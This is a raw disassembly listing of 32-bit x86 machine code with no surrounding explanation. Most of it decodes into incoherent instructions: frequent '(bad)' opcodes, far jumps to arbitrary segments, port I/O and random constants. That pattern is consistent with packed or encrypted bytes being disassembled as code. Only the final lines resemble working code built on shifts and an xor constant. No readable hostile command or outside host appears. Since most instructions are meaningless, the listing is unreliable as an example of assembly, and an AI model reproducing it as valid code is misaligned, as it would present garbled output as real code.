  41c143:	loopne 0x41c15f
  41c145:	call   0x2ebce17a
  41c14a:	add    edi,edx
  41c14c:	rol    BYTE PTR [esi+0x1ca97b1a],cl
  41c152:	mov    ebx,DWORD PTR [esi]
  41c154:	xchg   esi,eax
  41c155:	rcr    DWORD PTR [edx-0x1e],cl
  41c158:	dec    ebp
  41c159:	jmp    0x88f5:0xc35449dd
  41c160:	pop    ss
  41c161:	(bad)  
  41c162:	pop    esi
  41c163:	dec    eax
  41c164:	mov    ds:0xf8e14ec,eax
  41c169:	cmp    ebp,esp
  41c16b:	(bad)  
  41c16c:	push   ss
  41c16d:	out    0xf7,eax
  41c16f:	imul   edx,DWORD PTR [esi-0x25],0xffffff95
  41c173:	inc    BYTE PTR [eax+0x3fe72b33]
  41c179:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c17a:	or     eax,0x7ba938db
  41c17f:	add    eax,0xec021724
  41c184:	pop    ebp
  41c185:	mov    ebx,0x2b617a48
  41c18a:	iret   
  41c18b:	popf   
  41c18c:	(bad)  
  41c18d:	clc    
  41c18e:	retf   
  41c18f:	stc    
  41c190:	push   0xbe0cf62f
  41c195:	ins    DWORD PTR es:[edi],dx
  41c196:	inc    esp
  41c197:	(bad)  
  41c198:	pop    ss
  41c199:	lock arpl WORD PTR [ebp+0x476e599f],di
  41c1a0:	ins    BYTE PTR es:[edi],dx
  41c1a1:	in     eax,0x3c
  41c1a3:	pop    ss
  41c1a4:	adc    bh,BYTE PTR [ebx]
  41c1a6:	push   eax
  41c1a7:	or     eax,0x28700691
  41c1ac:	idiv   DWORD PTR [ecx+0x5c]
  41c1af:	dec    ebp
  41c1b0:	mov    ecx,0x7986a1a5
  41c1b5:	xor    eax,DWORD PTR [edx-0x4a]
  41c1b8:	sbb    al,0xf7
  41c1ba:	xchg   ebp,eax
  41c1bb:	rol    DWORD PTR [esi],1
  41c1bd:	jo     0x41c229
  41c1bf:	dec    edi
  41c1c0:	neg    BYTE PTR [ebx+0x58]
  41c1c3:	or     eax,0x62113d7e
  41c1c8:	jo     0x41c1a2
  41c1ca:	repnz rol DWORD PTR [esi-0x31c6d87f],0x87
  41c1d2:	and    ebp,DWORD PTR [ebx]
  41c1d4:	xor    edi,DWORD PTR [ebp-0x31]
  41c1d7:	shl    DWORD PTR [ebp-0x5b],0x24
  41c1db:	(bad)  
  41c1dc:	es fsub st(2),st
  41c1df:	scas   eax,DWORD PTR es:[edi]
  41c1e0:	dec    BYTE PTR [edi-0x61]
  41c1e3:	out    dx,al
  41c1e4:	pop    edi
  41c1e5:	sub    eax,0xcd4f0040
  41c1ea:	idiv   DWORD PTR ss:[ebp+eax*2-0x9]
  41c1ef:	dec    ebp
  41c1f0:	test   WORD PTR [eax+0x72],ax
  41c1f4:	xor    BYTE PTR ds:0x6664327,0x39
  41c1fb:	add    BYTE PTR [ecx+0x62],ah
  41c1fe:	(bad)  
  41c1ff:	test   DWORD PTR [esi],edi
  41c201:	jae    0x41c1dd
  41c203:	cdq    
  41c204:	addr16 enter 0x3e32,0xcc
  41c209:	dec    ecx
  41c20a:	cs push edi
  41c20c:	inc    esp
  41c20d:	jmp    0xef89:0x4c15dce9
  41c214:	sub    dh,ch
  41c216:	sub    ah,BYTE PTR [edi-0x2]
  41c219:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c21a:	mov    edi,DWORD PTR [eax+0x14]
  41c21d:	jp     0x41c213
  41c21f:	xchg   DWORD PTR [ebx+0x2d],ecx
  41c222:	rol    BYTE PTR [edx],0x0
  41c225:	retf   
  41c226:	pop    esp
  41c227:	push   eax
  41c228:	lods   eax,DWORD PTR ds:[esi]
  41c229:	loopne 0x41c226
  41c22b:	das    
  41c22c:	mov    esp,0x4871e7a2
  41c231:	push   esi
  41c232:	adc    DWORD PTR [ebp+0x28],0x6aa29719
  41c239:	lahf   
  41c23a:	jmp    0x4957:0x1bedc49
  41c241:	cld    
  41c242:	aad    0x8
  41c244:	cdq    
  41c245:	stc    
  41c246:	mov    bh,0xc1
  41c248:	daa    
  41c249:	int3   
  41c24a:	(bad)  
  41c24b:	sar    esi,cl
  41c24d:	dec    ecx
  41c24e:	mov    eax,0x71d9edf6
  41c253:	dec    esi
  41c254:	leave  
  41c255:	mov    edi,0x136e9d0a
  41c25a:	and    eax,DWORD PTR [edx-0x7c]
  41c25d:	inc    esi
  41c25e:	fadd   DWORD PTR [edx]
  41c260:	mov    ah,0x13
  41c262:	mov    ds:0xc8afff14,al
  41c267:	es push esi
  41c269:	inc    eax
  41c26a:	out    dx,eax
  41c26b:	ins    BYTE PTR es:[edi],dx
  41c26c:	js     0x41c2cb
  41c26e:	mov    eax,ds:0x1265d637
  41c273:	inc    eax
  41c274:	mov    ds:0x11993fca,al
  41c279:	aad    0xaf
  41c27b:	mov    ds:0x7145c313,eax
  41c280:	inc    eax
  41c281:	into   
  41c282:	arpl   sp,dx
  41c284:	pop    esi
  41c285:	test   DWORD PTR [esi-0x60],ecx
  41c288:	dec    ecx
  41c289:	stc    
  41c28a:	inc    ecx
  41c28b:	test   BYTE PTR [ecx-0x68e9c7b1],bh
  41c291:	jmp    0x9bf12d82
  41c296:	inc    ecx
  41c297:	mov    BYTE PTR [esi-0x1307d3ba],0xe0
  41c29e:	fbld   TBYTE PTR [esi+esi*8+0x65a35c8a]
  41c2a5:	out    0x41,eax
  41c2a7:	jb     0x41c244
  41c2a9:	call   0x7ae7ad0b
  41c2ae:	dec    eax
  41c2af:	int3   
  41c2b0:	fdivr  DWORD PTR [edi+0x520c53c7]
  41c2b6:	xchg   ecx,eax
  41c2b7:	push   eax
  41c2b8:	jno    0x41c26a
  41c2ba:	sub    BYTE PTR [eax+esi*1-0x10],bl
  41c2be:	add    DWORD PTR [ecx-0xd],ebx
  41c2c1:	mov    ebx,0x6b2ff9bb
  41c2c6:	stos   DWORD PTR es:[edi],eax
  41c2c7:	xor    ch,ch
  41c2c9:	pop    ds
  41c2ca:	pop    eax
  41c2cb:	mov    edx,0xfc9d141b
  41c2d0:	std    
  41c2d1:	sub    BYTE PTR [eax],al
  41c2d3:	sub    cl,dl
  41c2d5:	pop    ss
  41c2d6:	xchg   ebp,eax
  41c2d7:	dec    esi
  41c2d8:	inc    ebp
  41c2d9:	inc    esp
  41c2da:	int    0x75
  41c2dc:	mov    ds:0x9340d0a9,al
  41c2e1:	push   ebx
  41c2e2:	inc    dx
  41c2e4:	xchg   esp,esp
  41c2e6:	(bad)  
  41c2e7:	mov    bh,0xfa
  41c2e9:	stos   DWORD PTR es:[edi],eax
  41c2ea:	add    BYTE PTR [edi],cl
  41c2ec:	out    dx,al
  41c2ed:	mov    esi,0x2216721b
  41c2f2:	mov    ecx,0x58a7948d
  41c2f7:	or     ebx,DWORD PTR [eax+esi*8+0x1a01172e]
  41c2fe:	dec    ebx
  41c2ff:	push   ds
  41c300:	clc    
  41c301:	xor    al,0xae
  41c303:	shl    BYTE PTR [esi],1
  41c305:	sub    al,BYTE PTR [ebx+0x73]
  41c308:	loope  0x41c31d
  41c30a:	sub    dl,BYTE PTR [edi]
  41c30c:	leave  
  41c30d:	pop    esp
  41c30e:	or     bh,dl
  41c310:	and    eax,ebx
  41c312:	aam    0xe2
  41c314:	sar    DWORD PTR [eax-0x22e6c928],0x73
  41c31b:	stos   BYTE PTR es:[edi],al
  41c31c:	and    DWORD PTR [ebx+0x11],esp
  41c31f:	dec    ecx
  41c320:	mov    bl,0xa1
  41c322:	je     0x41c35b
  41c324:	out    dx,eax
  41c325:	push   DWORD PTR [eax+0x6564a50f]
  41c32b:	hlt    
  41c32c:	lds    eax,FWORD PTR [esi]
  41c32e:	adc    cl,BYTE PTR [esp+esi*1+0x63]
  41c332:	xor    BYTE PTR [esi],ah
  41c334:	sbb    DWORD PTR [esi+0x23],edi
  41c337:	push   edi
  41c338:	mov    ebx,0x62145854
  41c33d:	inc    edx
  41c33e:	js     0x41c39b
  41c340:	add    ecx,DWORD PTR [ecx-0x4b9d901c]
  41c346:	iret   
  41c347:	mov    ah,0xd2
  41c349:	xor    eax,0x720931d2
  41c34e:	add    BYTE PTR [esi+0x4a],ch
  41c351:	dec    ebp
  41c352:	push   0x943343c1
  41c357:	in     al,dx
  41c358:	maskmovq mm5,mm1
  41c35b:	ret    
  41c35c:	add    eax,0x7653e6cf
  41c361:	scas   eax,DWORD PTR es:[edi]
  41c362:	not    ecx
  41c364:	adc    edi,DWORD PTR [ebx-0x34bb810f]
  41c36a:	imul   ebp,DWORD PTR [ebx],0x97753ef
  41c370:	cmp    esi,esp
  41c372:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c373:	cmp    BYTE PTR [eax-0x3303ec1b],ah
  41c379:	or     BYTE PTR [edi],ch
  41c37b:	fdivr  DWORD PTR [ebp-0x2]
  41c37e:	mov    DWORD PTR [ebp+edx*2-0x1be6178d],ecx
  41c385:	ss push esi
  41c387:	retf   0xb29f
  41c38a:	or     DWORD PTR [edx],esp
  41c38c:	inc    esi
  41c38d:	mov    ebp,0xf0279e0b
  41c392:	cmp    edi,esp
  41c394:	aam    0xc9
  41c396:	mov    edi,0xa147f1b0
  41c39b:	sbb    ecx,DWORD PTR [edi+0x6f579f76]
  41c3a1:	test   DWORD PTR [eax],0x9e7643e
  41c3a7:	iret   
  41c3a8:	loop   0x41c35f
  41c3aa:	push   ecx
  41c3ab:	das    
  41c3ac:	loope  0x41c37e
  41c3ae:	jmp    0x41c397
  41c3b0:	and    eax,0x4af1e19b
  41c3b5:	hlt    
  41c3b6:	sub    DWORD PTR [esp+edi*2+0x3e6e5f25],edi
  41c3bd:	mov    ebx,0xadceaea2
  41c3c2:	xor    eax,0x360f66d
  41c3c7:	inc    ecx
  41c3c8:	scas   al,BYTE PTR es:[edi]
  41c3c9:	rol    cl,cl
  41c3cb:	sbb    al,0xe2
  41c3cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3ce:	push   ss
  41c3cf:	mov    BYTE PTR [esi+0xf635a51],cl
  41c3d5:	les    ebx,FWORD PTR [ecx+ecx*8-0x76bef6f2]
  41c3dc:	lds    eax,FWORD PTR [esi]
  41c3de:	adc    al,0xca
  41c3e0:	dec    eax
  41c3e1:	sub    BYTE PTR [esi-0x11],0x1a
  41c3e5:	aaa    
  41c3e6:	sbb    cl,BYTE PTR [eax+ebp*4-0x7c]
  41c3ea:	outs   dx,DWORD PTR ds:[esi]
  41c3eb:	aad    0x6b
  41c3ed:	in     eax,0x84
  41c3ef:	mov    BYTE PTR [ebx],ch
  41c3f1:	sub    DWORD PTR ds:0x5af83a17,esp
  41c3f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c3f8:	xchg   esi,eax
  41c3f9:	(bad)  
  41c3fa:	jns    0x41c3d6
  41c3fc:	add    dh,bh
  41c3fe:	in     eax,dx
  41c3ff:	or     BYTE PTR [esi-0x218e424b],bl
  41c405:	push   edi
  41c406:	enter  0xba4,0x7e
  41c40a:	push   0xf6e40957
  41c40f:	cmp    eax,0x560b6c24
  41c414:	hlt    
  41c415:	add    bh,0x37
  41c418:	xchg   ecx,eax
  41c419:	ss mov ch,0xf3
  41c41c:	pop    esi
  41c41d:	mov    ah,0x6b
  41c41f:	aam    0x53
  41c421:	mov    ecx,0xfbce902c
  41c426:	gs popa 
  41c428:	shl    bl,cl
  41c42a:	cmp    al,0x6a
  41c42c:	inc    esp
  41c42d:	mov    bl,0x29
  41c42f:	or     DWORD PTR cs:[edi],eax
  41c432:	aam    0x90
  41c434:	lods   eax,DWORD PTR ds:[esi]
  41c435:	jno    0x41c463
  41c437:	push   ss
  41c438:	jecxz  0x41c499
  41c43a:	jle    0x41c409
  41c43c:	call   0xe817:0x457d6dd8
  41c443:	inc    ecx
  41c444:	mov    WORD PTR [eax+0x45a918d3],cs
  41c44a:	xchg   ecx,eax
  41c44b:	lock inc edx
  41c44d:	int    0x87
  41c44f:	add    DWORD PTR [esp+edi*8+0xafc64b1],ebx
  41c456:	shr    DWORD PTR [edx-0x619a8827],1
  41c45c:	xlat   BYTE PTR ds:[ebx]
  41c45d:	shr    DWORD PTR [ebp+0x1b258e97],0x2c
  41c464:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c465:	lods   eax,DWORD PTR ds:[esi]
  41c466:	in     al,0x7f
  41c468:	add    eax,DWORD PTR [ebp+edi*1-0x33a73c0c]
  41c46f:	int    0xac
  41c471:	pop    edx
  41c472:	xchg   edi,eax
  41c473:	pop    esp
  41c474:	pop    ebx
  41c475:	out    dx,eax
  41c476:	fdivr  st,st(7)
  41c478:	or     BYTE PTR [eax+esi*1+0x3a],0x10
  41c47d:	imul   esp,DWORD PTR ds:0xada5f7b3,0xeab08cd1
  41c487:	clc    
  41c488:	outs   dx,BYTE PTR ds:[esi]
  41c48a:	push   0x277aa74c
  41c48f:	pop    edx
  41c490:	mov    DWORD PTR [edx-0x776e4e2],esp
  41c496:	xor    DWORD PTR [ebx+0x5e094ee3],ebp
  41c49c:	mov    ds:0xde9cec94,al
  41c4a1:	imul   ebp,DWORD PTR [edi-0x430c15c5],0xffffffd5
  41c4a8:	sar    BYTE PTR [ebp+0x11],cl
  41c4ab:	xor    eax,DWORD PTR [esi]
  41c4ad:	mov    al,ds:0x3a11bec0
  41c4b2:	mov    cl,0xcb
  41c4b4:	call   0x414dd5
  41c4b9:	jmp    0x41c888
  41c4be:	inc    edi
  41c4bf:	and    edi,DWORD PTR [eax]
  41c4c1:	sbb    DWORD PTR [ebx+eax*1],esi
  41c4c4:	daa    
  41c4c5:	and    cl,BYTE PTR [ebx]
  41c4c7:	cdq    
  41c4c8:	lahf   
  41c4c9:	jo     0x41c4e9
  41c4cb:	mov    ds:0x734a6a35,al
  41c4d0:	push   ss
  41c4d1:	sbb    BYTE PTR [edx+edx*1+0x37671818],bh
  41c4d8:	and    BYTE PTR [esi],0x36
  41c4db:	aad    0x8e
  41c4dd:	jae    0x41c557
  41c4df:	jb     0x41c483
  41c4e1:	xchg   DWORD PTR [edx+0x4c],edi
  41c4e4:	mov    ebx,0xa1ed7304
  41c4e9:	popa   
  41c4ea:	xchg   ebp,eax
  41c4eb:	(bad)  
  41c4ec:	sar    DWORD PTR [ecx+ebx*8],cl
  41c4ef:	nop
  41c4f0:	adc    ebx,DWORD PTR [eax+0x1d]
  41c4f3:	ins    BYTE PTR es:[edi],dx
  41c4f4:	push   ebp
  41c4f5:	fiadd  WORD PTR [edx+0x39ecd9c2]
  41c4fb:	es push cs
  41c4fd:	mov    ds:0x99a98dbf,al
  41c502:	mov    ch,0x4c
  41c504:	popa   
  41c505:	push   esi
  41c506:	or     edi,DWORD PTR [edi]
  41c508:	leave  
  41c509:	sub    ebx,DWORD PTR [ebx-0x2d]
  41c50c:	pushf  
  41c50d:	stos   DWORD PTR es:[edi],eax
  41c50e:	push   0xf4aa9150
  41c513:	pop    esi
  41c514:	out    dx,eax
  41c515:	ds xor ebx,0xffffffe4
  41c519:	loope  0x41c4a6
  41c51b:	cmp    BYTE PTR [edx],bl
  41c51d:	les    esi,FWORD PTR [edi+0x59]
  41c520:	adc    al,0xd2
  41c522:	mov    dl,0x8f
  41c524:	and    dh,ah
  41c526:	xor    al,0x26
  41c528:	cs fdivrp st(3),st
  41c52b:	mov    ecx,0xc622070e
  41c530:	jl     0x41c502
  41c532:	fs daa 
  41c534:	jle    0x41c4ed
  41c536:	pop    esp
  41c537:	jl     0x41c4ed
  41c539:	xor    edx,DWORD PTR [esi+0x6f]
  41c53c:	test   ch,bh
  41c53e:	out    dx,eax
  41c53f:	add    eax,0xe71e8042
  41c544:	(bad)  
  41c545:	cmc    
  41c546:	pushf  
  41c547:	mov    DWORD PTR [ebx-0x4c],ebx
  41c54a:	dec    esp
  41c54b:	fisttp QWORD PTR [edi+0x3c38d704]
  41c551:	bound  edi,QWORD PTR [ebp-0x74abb60c]
  41c557:	cmc    
  41c558:	nop
  41c559:	mov    eax,DWORD PTR [edi-0x3d6fcedd]
  41c55f:	jne    0x41c583
  41c561:	ror    BYTE PTR [ecx],1
  41c563:	mov    WORD PTR [ebp+0x13207101],fs
  41c569:	(bad)  
  41c56a:	pop    edx
  41c56b:	je     0x41c4f2
  41c56d:	sub    BYTE PTR [ebp+0x33c1a25b],dh
  41c573:	pop    esi
  41c574:	jmp    DWORD PTR [edi+0x42b44fce]
  41c57a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c57b:	or     esi,ebp
  41c57d:	dec    edi
  41c57e:	scas   eax,DWORD PTR es:[edi]
  41c57f:	call   0x7eb5d713
  41c584:	sbb    ebx,DWORD PTR [ebp-0x6475079d]
  41c58a:	fs mov dl,0x97
  41c58d:	aad    0x12
  41c58f:	xchg   bl,cl
  41c591:	jmp    0x41c5a2
  41c593:	jp     0x41c54b
  41c595:	dec    edx
  41c596:	std    
  41c597:	jno    0x41c5f2
  41c599:	into   
  41c59a:	leave  
  41c59b:	lock and ecx,DWORD PTR [ebx+0x34]
  41c59f:	inc    ebx
  41c5a0:	dec    ebp
  41c5a1:	daa    
  41c5a2:	or     eax,0xcb722a54
  41c5a7:	pop    ebx
  41c5a8:	xor    edx,DWORD PTR [ebx-0x744e193b]
  41c5ae:	mov    al,0xa3
  41c5b0:	pop    ecx
  41c5b1:	add    BYTE PTR [esi+0x4e08e54f],cl
  41c5b7:	push   cs
  41c5b8:	ss pushf 
  41c5ba:	pushf  
  41c5bb:	dec    ebx
  41c5bc:	mov    bl,0xde
  41c5be:	loopne 0x41c540
  41c5c0:	adc    ecx,DWORD PTR [eax]
  41c5c2:	mov    ds:0x3bce4586,al
  41c5c7:	xlat   BYTE PTR ds:[ebx]
  41c5c8:	daa    
  41c5c9:	jo     0x41c647
  41c5cb:	mov    edi,DWORD PTR [edi-0x78949660]
  41c5d1:	arpl   WORD PTR [eax-0x3d],di
  41c5d4:	fidiv  DWORD PTR [ecx]
  41c5d6:	out    dx,eax
  41c5d7:	mov    ds:0x323c4164,al
  41c5dc:	ja     0x41c642
  41c5de:	dec    eax
  41c5df:	xchg   dl,dl
  41c5e1:	cdq    
  41c5e2:	fmul   QWORD PTR [esi+eax*1+0xd8cac49]
  41c5e9:	mov    BYTE PTR [edi+eiz*2],bl
  41c5ec:	ds mov edx,0x11b977db
  41c5f2:	ja     0x41c5d4
  41c5f4:	leave  
  41c5f5:	mov    cl,0x39
  41c5f7:	pop    ds
  41c5f8:	xlat   BYTE PTR ds:[ebx]
  41c5f9:	xchg   esp,eax
  41c5fa:	icebp  
  41c5fb:	pop    ebx
  41c5fc:	retf   0xf4b6
  41c5ff:	or     eax,0xaa1594e3
  41c604:	out    dx,eax
  41c605:	call   0x1640:0x98da5b75
  41c60c:	push   es
  41c60d:	mov    ebx,0x264a8912
  41c612:	pop    ecx
  41c613:	pop    edx
  41c614:	inc    ebx
  41c615:	lock push edi
  41c617:	lods   al,BYTE PTR ds:[esi]
  41c618:	ins    BYTE PTR es:[edi],dx
  41c619:	xchg   edi,eax
  41c61a:	mov    bh,0x1c
  41c61c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c61d:	loop   0x41c616
  41c61f:	xchg   edx,eax
  41c620:	imul   esi,DWORD PTR [esi-0x28],0x83358f46
  41c627:	repz cdq 
  41c629:	popf   
  41c62a:	jnp    0x41c5f8
  41c62c:	adc    ch,BYTE PTR [edi]
  41c62e:	enter  0xd282,0xdc
  41c632:	push   0x5ed4807f
  41c637:	xchg   ebx,eax
  41c638:	jne    0x41c5d5
  41c63a:	and    DWORD PTR [edx+0x6b],0x5cba1915
  41c641:	les    eax,FWORD PTR [esi-0x500b6749]
  41c647:	adc    DWORD PTR ss:[ebx],0x6c
  41c64b:	jae    0x41c697
  41c64d:	ror    DWORD PTR [esi-0x3b],cl
  41c650:	icebp  
  41c651:	loopne 0x41c681
  41c653:	mov    ds:0xae308fa0,eax
  41c658:	inc    ecx
  41c659:	dec    edx
  41c65a:	test   al,dl
  41c65c:	popf   
  41c65d:	mov    dh,0xfc
  41c65f:	icebp  
  41c660:	push   cs
  41c661:	cmp    al,0x3b
  41c663:	std    
  41c664:	inc    ebx
  41c665:	(bad)  
  41c666:	push   ebx
  41c667:	mov    ebp,0x31452a5a
  41c66c:	pop    es
  41c66d:	mov    al,0x34
  41c66f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c670:	adc    DWORD PTR [esi+ebx*2-0x7439bc19],0xd9d4b083
  41c67b:	xchg   esi,eax
  41c67c:	push   cs
  41c67d:	mov    al,0x57
  41c67f:	dec    ebp
  41c680:	es ds mov dh,0xb7
  41c684:	mov    edx,DWORD PTR [ebp+0x7b]
  41c687:	mov    cl,ah
  41c689:	push   ss
  41c68a:	jne    0x41c6de
  41c68c:	inc    ebx
  41c68d:	mov    es,WORD PTR [edx-0x47]
  41c690:	sub    dl,ch
  41c692:	xchg   ebx,eax
  41c693:	xchg   BYTE PTR [eax+ecx*4],bh
  41c696:	call   0xb37a:0xd8802293
  41c69d:	push   es
  41c69e:	mov    bl,0x5f
  41c6a0:	dec    edi
  41c6a1:	inc    esi
  41c6a2:	retf   0x69f0
  41c6a5:	fdiv   QWORD PTR [ecx+0x3fd553ca]
  41c6ab:	(bad)  
  41c6ac:	push   ebx
  41c6ad:	and    ah,bl
  41c6af:	adc    ebp,DWORD PTR [edx+0x76d294f3]
  41c6b5:	xchg   edx,eax
  41c6b6:	es sar bl,cl
  41c6b9:	mov    eax,ds:0x12f76d38
  41c6be:	sahf   
  41c6bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6c0:	and    dl,BYTE PTR [ebx-0x14]
  41c6c3:	ficom  DWORD PTR [ecx+0x71f51a9]
  41c6c9:	push   esi
  41c6ca:	(bad)  
  41c6cb:	sbb    bl,ch
  41c6cd:	pop    ss
  41c6ce:	mov    ss,WORD PTR [esi+eiz*1]
  41c6d1:	ret    
  41c6d2:	call   FWORD PTR [esi+ecx*8]
  41c6d5:	ins    BYTE PTR es:[edi],dx
  41c6d6:	loope  0x41c6cc
  41c6d8:	pop    ds
  41c6d9:	fisubr WORD PTR [ecx-0x70663821]
  41c6df:	pop    edi
  41c6e0:	lods   eax,DWORD PTR ds:[esi]
  41c6e1:	loopne 0x41c6ff
  41c6e3:	mov    ds:0x2c993899,eax
  41c6e8:	push   ebp
  41c6e9:	bswap  ecx
  41c6eb:	add    DWORD PTR [ebx],ebx
  41c6ed:	jmp    0xecf9640
  41c6f2:	std    
  41c6f3:	mov    ebx,0x46e2f846
  41c6f8:	push   edi
  41c6f9:	or     al,0xc1
  41c6fb:	xor    bh,BYTE PTR [eax+edi*2-0x3]
  41c6ff:	jl     0x41c74e
  41c701:	jmp    0x6b41:0xa7f91fd9
  41c708:	pop    eax
  41c709:	addr16 mov edi,edx
  41c70c:	mov    dl,0xee
  41c70e:	outs   dx,DWORD PTR ds:[esi]
  41c70f:	cwde   
  41c710:	jae    0x41c790
  41c712:	push   cs
  41c713:	adc    eax,0x4cdd44b2
  41c718:	push   eax
  41c719:	jl     0x41c6dc
  41c71b:	pop    eax
  41c71c:	(bad)  
  41c71d:	bound  edi,QWORD PTR [ebp+0x2d98df69]
  41c723:	fild   WORD PTR [edx+0x7baebdf4]
  41c729:	mov    ebx,0x4b6dab1f
  41c72e:	fild   QWORD PTR [eax]
  41c730:	scas   al,BYTE PTR es:[edi]
  41c731:	ins    BYTE PTR es:[edi],dx
  41c732:	addr16 add ch,ch
  41c735:	xor    esp,edx
  41c737:	dec    ebx
  41c738:	test   DWORD PTR [esi],ebx
  41c73a:	ror    BYTE PTR [ecx+0x3a],cl
  41c73d:	mov    dh,0x85
  41c73f:	sbb    dl,cl
  41c741:	das    
  41c742:	xor    BYTE PTR [esp+ecx*4-0x32],0x24
  41c747:	js     0x41c70a
  41c749:	mov    eax,0x113ccc43
  41c74e:	pushf  
  41c74f:	dec    edx
  41c750:	xor    DWORD PTR [eax-0x13],0xffffffc9
  41c754:	fistp  WORD PTR [eax-0x44]
  41c757:	dec    esp
  41c758:	push   esp
  41c759:	mov    ds:0x57c10d5e,al
  41c75e:	add    ch,al
  41c760:	push   esi
  41c761:	inc    esi
  41c762:	cmp    ebp,DWORD PTR [eax]
  41c764:	xor    al,0xab
  41c766:	sbb    DWORD PTR [esi-0x75],0x9ca133af
  41c76d:	xchg   ebx,eax
  41c76e:	les    ecx,FWORD PTR [edi]
  41c770:	dec    ebp
  41c771:	jecxz  0x41c7ad
  41c773:	(bad)
  41c776:	cmp    al,0x16
  41c778:	clc    
  41c779:	les    ebx,FWORD PTR ds:0x5d5cdef0
  41c77f:	or     ah,BYTE PTR [esp+eiz*4]
  41c782:	test   al,0xf9
  41c784:	inc    esi
  41c785:	xor    DWORD PTR [edx-0x3e],ebp
  41c788:	dec    BYTE PTR [esi+0x10]
  41c78b:	jle    0x41c779
  41c78d:	dec    ecx
  41c78e:	jecxz  0x41c735
  41c790:	dec    esp
  41c791:	stos   BYTE PTR es:[edi],al
  41c792:	push   edi
  41c793:	adc    bl,BYTE PTR [ebx+eiz*2-0x7c]
  41c797:	pop    es
  41c798:	mov    eax,ds:0xed1b2cee
  41c79d:	push   0xffffff8c
  41c79f:	std    
  41c7a0:	jbe    0x41c7a5
  41c7a2:	mov    ds:0x93697c45,eax
  41c7a7:	rcl    DWORD PTR [esi],0xe9
  41c7aa:	dec    edi
  41c7ab:	call   0x40c7ef31
  41c7b0:	push   0xc66bb95b
  41c7b5:	in     al,0x58
  41c7b7:	add    al,0xda
  41c7b9:	jp     0x41c803
  41c7bb:	adc    al,0x84
  41c7bd:	cmp    bl,BYTE PTR [edi]
  41c7bf:	and    eax,0x4dc9a2ba
  41c7c4:	sub    ecx,ecx
  41c7c6:	frstor [ecx]
  41c7c8:	dec    ebx
  41c7c9:	xchg   esi,eax
  41c7ca:	(bad)  
  41c7cb:	test   eax,0xdcff5d25
  41c7d0:	push   ebp
  41c7d1:	rol    bh,cl
  41c7d3:	and    eax,0xcad1fbf9
  41c7d8:	sub    DWORD PTR ss:[esp+ebx*4-0x36f5127f],edi
  41c7e0:	outs   dx,DWORD PTR ds:[esi]
  41c7e1:	into   
  41c7e2:	fld    st(5)
  41c7e4:	adc    eax,0xa0b0c9af
  41c7ea:	sub    eax,esi
  41c7ec:	sti    
  41c7ed:	int3   
  41c7ee:	adc    eax,0x3c00615b
  41c7f3:	push   0xbfcafc6c
  41c7f8:	lock jnp 0x41c7f3
  41c7fb:	pop    ebx
  41c7fc:	jp     0x41c78d
  41c7fe:	fwait
  41c7ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c800:	imul   ebx,ebx,0x6d
  41c803:	mov    ds:0x916d1621,al
  41c808:	pop    ebp
  41c809:	jl     0x41c867
  41c80b:	cmc    
  41c80c:	jle    0x41c876
  41c80e:	ret    
  41c80f:	mov    DWORD PTR [ebp+eiz*4+0x14],edi
  41c813:	mov    ds:0x2a61e71d,al
  41c818:	inc    esp
  41c819:	cs aad 0xf1
  41c81c:	cmp    eax,0xb3a15c56
  41c821:	mov    al,ds:0x34a5b7c3
  41c826:	fimul  DWORD PTR [edi]
  41c828:	lods   eax,DWORD PTR ds:[esi]
  41c829:	xor    eax,0x59bf97e
  41c82e:	sub    BYTE PTR [ebx+edi*8-0x31067c18],bl
  41c835:	sub    al,0x5f
  41c837:	into   
  41c838:	jle    0x41c82b
  41c83a:	fbstp  TBYTE PTR [ecx]
  41c83c:	jmp    0xbad03f42
  41c841:	sbb    dl,bh
  41c843:	fdivr  QWORD PTR [edx]
  41c845:	jne    0x41c816
  41c847:	retf   
  41c848:	jnp    0x41c85b
  41c84a:	std    
  41c84b:	(bad)  
  41c84c:	mov    bl,0xbf
  41c84e:	dec    esp
  41c84f:	xor    BYTE PTR [esi+0x23],dh
  41c852:	dec    edx
  41c853:	shl    dl,0xff
  41c856:	sub    ah,BYTE PTR [eax-0x1470ffdf]
  41c85c:	shl    BYTE PTR [ebp+0x67],0xe7
  41c860:	out    0x71,eax
  41c862:	pop    es
  41c863:	sbb    ebx,ebx
  41c865:	and    al,BYTE PTR [edx+0x43]
  41c868:	mov    ebx,0x5108fea1
  41c86d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c86e:	jle    0x41c82c
  41c870:	int    0xb6
  41c872:	mov    ch,0xb1
  41c874:	fsubr  DWORD PTR [ecx-0x6d5dca82]
  41c87a:	or     cl,BYTE PTR [ebx-0x338e6009]
  41c880:	rcl    BYTE PTR [esi+0x46],cl
  41c883:	mov    dh,0x3f
  41c885:	xor    ebp,edi
  41c887:	test   bh,bh
  41c889:	je     0x41c8af
  41c88b:	je     0x41c88c
  41c88d:	je     0x41c8b3
  41c88f:	je     0x41c890
  41c891:	je     0x41c8b7
  41c893:	and    al,0xff
  41c895:	je     0x41c8bb
  41c897:	and    al,0xe8
  41c899:	imul   edx,DWORD PTR [ecx+0x548bffff],0x448b1824
  41c8a3:	and    al,0x1c
  41c8a5:	mov    ecx,DWORD PTR [esp+0x18]
  41c8a9:	mov    edi,DWORD PTR [esp+0x1c]
  41c8ad:	shrd   edx,eax,0x2
  41c8b1:	shr    eax,0x2
  41c8b4:	shl    ecx,0x1e
  41c8b7:	xor    ecx,ecx
  41c8b9:	mov    eax,0x329e695d
  41c8be:	xor    edx,eax
  41c8c0:	or     ecx,edx
  41c8c2:	mov    edx,DWORD PTR [esp+0x5c]
  41c8c6:	mov    DWORD PTR [edx],ecx
  41c8c8:	mov    ecx,DWORD PTR [esp+0x18]
  41c8cc:	mov    edx,DWORD PTR [esp+0x1c]
  41c8d0:	shrd   ecx,edx,0x2
  41c8d4:	xor    ecx,eax
